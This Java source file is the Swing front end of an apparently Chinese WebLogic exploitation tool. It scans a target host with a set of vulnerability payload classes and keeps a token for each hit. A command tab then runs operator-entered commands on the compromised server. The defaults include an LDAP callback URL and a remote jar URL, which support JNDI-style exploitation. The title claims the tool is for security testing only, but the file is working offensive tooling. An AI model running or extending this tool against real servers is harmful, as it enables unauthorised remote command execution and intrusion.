package com.weblogic.framework.ui;

import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import com.intellij.uiDesigner.core.Spacer;
import com.weblogic.framework.entity.MyException;
import com.weblogic.framework.payloads.VulTest;
import com.weblogic.framework.utils.StringUtils;
import com.weblogic.framework.utils.CallUtils;
import com.weblogic.framework.utils.VulUtils;
import lombok.SneakyThrows;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.lang.reflect.Field;
import java.util.*;
import java.util.List;

import static com.weblogic.framework.utils.ContextUtils.clearContext;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: Main
 * Desc: Main
 * Date:2020/4/2 20:01
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class Main extends JFrame {

    private JPanel mainPanel;
    private JTextField targetText;
    private JLabel targetLabel;
    private JTextField javascriptText;
    private JLabel javascriptLabel;
    private JLabel vulNumberLabel;
    private JComboBox vulComboBox;
    private JPanel serverInfoPanel;
    private JTextArea serverInfoText;
    private JButton checkButton;
    private JTabbedPane dataPanel;
    private JPanel cmdExecutePanel;
    private JTextField tokenText;
    private JTextField cmdText;
    private JButton executeButton;
    private JTextArea cmdRspTextArea;
    private JLabel tokenLabel;
    private JLabel cmdLabel;
    private JScrollPane cmdScrollPane;
    private JScrollPane serverInfoScrollPane;
    private JComboBox callComboBox;
    private JComboBox charsetComboBox;
    private JLabel charsetLabel;
    private JLabel callText;
    private JTextField ldapUrlText;

    private Map<String, VulTest> vulMap = new HashMap<String, VulTest>(16);

    public Main(String title) {
        super(title);
        this.setContentPane(mainPanel);
        // init vul name
        String[] vulNames = VulTest.Utils.getVulNames();
        for (String vulName : vulNames) {
            vulComboBox.addItem(vulName);
        }
        String header = "\n" +
                "点击 `验证` 会自动测试目标是否存在关于 Weblogic 的漏洞.\n\n";
        String text = serverInfoText.getText();
        text = header + VulUtils.getVulInfo() + "\n" + text;
        serverInfoText.setText(text);
        this.setSize(1000, 600);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setLocationRelativeTo(null);
        /**
         * set call class
         */
        for (String className : CallUtils.CALL_NAMES) {
            callComboBox.addItem(className);
        }

        checkButton.addActionListener(new ActionListener() {
            /**
             * Invoked when an action occurs.
             *
             * @param e
             */
            @SneakyThrows
            @Override
            public void actionPerformed(ActionEvent e) {
                new Thread(new Runnable() {
                    @SneakyThrows
                    @Override
                    public void run() {
                        validateVul();
                    }
                }).start();
            }
        });
        executeButton.addActionListener(new ActionListener() {
            /**
             * Invoked when an action occurs.
             *
             * @param e
             */
            @Override
            public void actionPerformed(ActionEvent e) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        exploit();
                    }
                }).start();
            }
        });
        this.addWindowListener(new WindowAdapter() {
            /**
             * Invoked when a window is in the process of being closed.
             * The close operation can be overridden at this point.
             * @param e
             */
            @Override
            public void windowClosing(WindowEvent e) {
                // clear vul info
                super.windowClosing(e);
                clearContext(vulMap);
                vulMap.clear();
            }

            /**
             * Invoked when a window has been closed.
             * @param e
             */
            @Override
            public void windowClosed(WindowEvent e) {
                // clear vul info
                super.windowClosed(e);
                clearContext(vulMap);
                vulMap.clear();
            }
        });
    }

    /**
     * 漏洞验证
     */
    private void validateVul() {
        clearContext(vulMap);
        vulMap.clear();
        serverInfoText.setText("");
        cmdRspTextArea.setText("");
        String javascriptUrl = javascriptText.getText();
        javascriptUrl = javascriptUrl.trim();
        String callName = callComboBox.getSelectedItem().toString();
        String ldapUrl = ldapUrlText.getText();
        ldapUrl = ldapUrl.trim();
        String charsetName = charsetComboBox.getSelectedItem().toString();
        if ("请选择".equals(charsetName)) {
            charsetName = null;
        }
        String vulName = vulComboBox.getSelectedItem().toString();
        String host = targetText.getText().trim();
        host = host.replace("\\", "/");
        if (host.lastIndexOf("/") != -1) {
            host = host.substring(0, host.lastIndexOf("/"));
        }
        // 探测所有POC
        final List<Class<? extends VulTest>> vulClasses = new ArrayList<Class<? extends VulTest>>(VulTest.Utils.getVulTest());
        Collections.sort(vulClasses, new StringUtils.ToStringComparator());
        serverInfoText.setText("漏洞验证中.....");
        validateVul(host, javascriptUrl, ldapUrl, charsetName, callName, vulClasses, vulName);
    }

    /**
     * 漏洞验证
     * @param host host
     * @param javascriptUrl javascript url
     * @param ldapUrl ldap url
     * @param charsetName 编码
     * @param callName 回调类
     * @param vulClasses 所有漏洞名称
     * @param vulName 当前选择漏洞
     */
    public void validateVul(String host, String javascriptUrl, String ldapUrl, String charsetName, String callName, List<Class<? extends VulTest>> vulClasses, String vulName) {
        String tmp = "";
        // 反射执行 vulClasses
        for (Class<? extends VulTest> clazz : vulClasses) {
            String simpleName = clazz.getSimpleName();
            vulName = vulName.replace("-", "_");
            if (!simpleName.equals(vulName) && !"请选择".equals(vulName)) {
                continue;
            }
            VulTest vulTest = null;
            Boolean flag = false;
            String msg = "";
            try {
                vulTest = clazz.newInstance();
                flag = vulTest.vulnerable(host, javascriptUrl, ldapUrl, charsetName, callName);
            } catch (Exception e) {
                if (e instanceof MyException) {
                    msg = e.getMessage();
                } else {
                    e.printStackTrace();
                }
            }
            String token = "";
            if (flag) {
                try {
                    Field bindNameField = clazz.getDeclaredField("bindName");
                    bindNameField.setAccessible(true);
                    token = bindNameField.get(vulTest).toString();
                    vulMap.put(token, vulTest);
                } catch (NoSuchFieldException e) {
                    // TODO:
                } catch (IllegalAccessException e) {
                    // TODO:
                }
            }
            String tmpStr = "";
            if (!isBlank(msg)) {
                tmpStr = clazz.getSimpleName() + "  " + host + "  " + msg + "\n\n";
            } else {
                if (flag) {
                    tmpStr = clazz.getSimpleName() + "  " + host + "  漏洞存在  " + " token : " + token + "\n\n";
                } else {
                    tmpStr = clazz.getSimpleName() + "  " + host + "  漏洞不存在  " + " token : " + token + "\n\n";
                }
            }
            tmp += tmpStr;
            serverInfoText.setText(tmp);
        }
    }

    /**
     * 漏洞利用
     */
    public void exploit() {
        String host = targetText.getText().trim();
        host = host.replace("\\", "/");
        if (host.lastIndexOf("/") != -1) {
            host = host.substring(0, host.lastIndexOf("/"));
        }
        String token = tokenText.getText().trim();
        if (isBlank(token)) {
            cmdRspTextArea.setText("请输入Token");
            return;
        }
        String cmd = cmdText.getText().trim();
        if (isBlank(cmd)) {
            cmdRspTextArea.setText("请输入执行命令");
            return;
        }
        cmdRspTextArea.setText(cmd + " 命令执行中.....");
        VulTest vul = vulMap.get(token);
        String charsetName = charsetComboBox.getSelectedItem().toString();
        if ("自动".equals(charsetName)) {
            charsetName = null;
        }
        if (vul != null) {
            try {
                String rsp = vul.exploit(host, cmd, charsetName);
                cmdRspTextArea.setText(rsp);
            } catch (Exception ex) {
                if (ex instanceof MyException) {
                    cmdRspTextArea.setText(ex.getMessage());
                } else {
                    cmdRspTextArea.setText("执行失败");
                }
            }
        } else {
            cmdRspTextArea.setText("token 无效");
        }
    }

    public static void main(String[] args) {
        JFrame main = new Main("Weblogic 检测工具 仅供安全检测使用，勿用于非法用途");
        main.setVisible(true);
    }

    {
// GUI initializer generated by IntelliJ IDEA GUI Designer
// >>> IMPORTANT!! <<<
// DO NOT EDIT OR ADD ANY CODE HERE!
        $$$setupUI$$$();
    }

    /** Method generated by IntelliJ IDEA GUI Designer
     * >>> IMPORTANT!! <<<
     * DO NOT edit this method OR call it in your code!
     * @noinspection ALL
     */
    private void $$$setupUI$$$() {
        mainPanel = new JPanel();
        mainPanel.setLayout(new GridLayoutManager(6, 6, new Insets(10, 10, 10, 10), -1, -1));
        targetLabel = new JLabel();
        targetLabel.setText("目标地址");
        mainPanel.add(targetLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        targetText = new JTextField();
        targetText.setText("http://10.10.10.172:7001");
        mainPanel.add(targetText, new GridConstraints(0, 1, 1, 5, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        javascriptLabel = new JLabel();
        javascriptLabel.setText("javascript 地址");
        mainPanel.add(javascriptLabel, new GridConstraints(1, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        javascriptText = new JTextField();
        javascriptText.setText("https://baidu.com/com.bea.javascript.jar");
        mainPanel.add(javascriptText, new GridConstraints(1, 1, 1, 5, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        final JLabel label1 = new JLabel();
        label1.setText("LDAP 地址");
        mainPanel.add(label1, new GridConstraints(2, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        ldapUrlText = new JTextField();
        ldapUrlText.setText("ldap://127.0.0.1:1099/#Poc");
        mainPanel.add(ldapUrlText, new GridConstraints(2, 1, 1, 5, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        vulNumberLabel = new JLabel();
        vulNumberLabel.setText("漏洞编号");
        mainPanel.add(vulNumberLabel, new GridConstraints(3, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        vulComboBox = new JComboBox();
        vulComboBox.setEnabled(true);
        final DefaultComboBoxModel defaultComboBoxModel1 = new DefaultComboBoxModel();
        defaultComboBoxModel1.addElement("请选择");
        vulComboBox.setModel(defaultComboBoxModel1);
        mainPanel.add(vulComboBox, new GridConstraints(3, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        final Spacer spacer1 = new Spacer();
        mainPanel.add(spacer1, new GridConstraints(4, 0, 1, 6, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, 1, null, null, null, 0, false));
        dataPanel = new JTabbedPane();
        mainPanel.add(dataPanel, new GridConstraints(5, 0, 1, 6, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, new Dimension(200, 200), null, 0, false));
        serverInfoPanel = new JPanel();
        serverInfoPanel.setLayout(new GridLayoutManager(2, 2, new Insets(0, 0, 0, 0), -1, -1));
        dataPanel.addTab("漏洞验证", serverInfoPanel);
        checkButton = new JButton();
        checkButton.setText("验证");
        serverInfoPanel.add(checkButton, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_EAST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        serverInfoScrollPane = new JScrollPane();
        serverInfoPanel.add(serverInfoScrollPane, new GridConstraints(1, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, null, null, null, 0, false));
        serverInfoText = new JTextArea();
        serverInfoText.setEditable(false);
        serverInfoText.setLineWrap(true);
        serverInfoText.setText("\n------------------------------------------------------\n\n更新日志：\n\n1. 2020-04-01\n\n  1) 修改 weblogic 文件 13 个版本，支持 NAT 网络.\n");
        serverInfoScrollPane.setViewportView(serverInfoText);
        cmdExecutePanel = new JPanel();
        cmdExecutePanel.setLayout(new GridLayoutManager(2, 6, new Insets(0, 0, 0, 0), -1, -1));
        dataPanel.addTab("命令执行", cmdExecutePanel);
        tokenLabel = new JLabel();
        tokenLabel.setText("token");
        cmdExecutePanel.add(tokenLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        tokenText = new JTextField();
        cmdExecutePanel.add(tokenText, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        cmdLabel = new JLabel();
        cmdLabel.setText("执行命令");
        cmdExecutePanel.add(cmdLabel, new GridConstraints(0, 2, 1, 2, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        cmdText = new JTextField();
        cmdExecutePanel.add(cmdText, new GridConstraints(0, 4, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        executeButton = new JButton();
        executeButton.setText("执行");
        cmdExecutePanel.add(executeButton, new GridConstraints(0, 5, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        cmdScrollPane = new JScrollPane();
        cmdExecutePanel.add(cmdScrollPane, new GridConstraints(1, 0, 1, 6, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, null, null, null, 0, false));
        cmdRspTextArea = new JTextArea();
        cmdRspTextArea.setEditable(false);
        cmdRspTextArea.setLineWrap(true);
        cmdScrollPane.setViewportView(cmdRspTextArea);
        callText = new JLabel();
        callText.setText("回显类");
        mainPanel.add(callText, new GridConstraints(3, 2, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        callComboBox = new JComboBox();
        mainPanel.add(callComboBox, new GridConstraints(3, 3, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        charsetLabel = new JLabel();
        charsetLabel.setText("编码");
        mainPanel.add(charsetLabel, new GridConstraints(3, 4, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        charsetComboBox = new JComboBox();
        final DefaultComboBoxModel defaultComboBoxModel2 = new DefaultComboBoxModel();
        defaultComboBoxModel2.addElement("自动");
        defaultComboBoxModel2.addElement("UTF-8");
        defaultComboBoxModel2.addElement("GBK");
        charsetComboBox.setModel(defaultComboBoxModel2);
        mainPanel.add(charsetComboBox, new GridConstraints(3, 5, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
    }

    /** @noinspection ALL */
    public JComponent $$$getRootComponent$$$() {
        return mainPanel;
    }

}
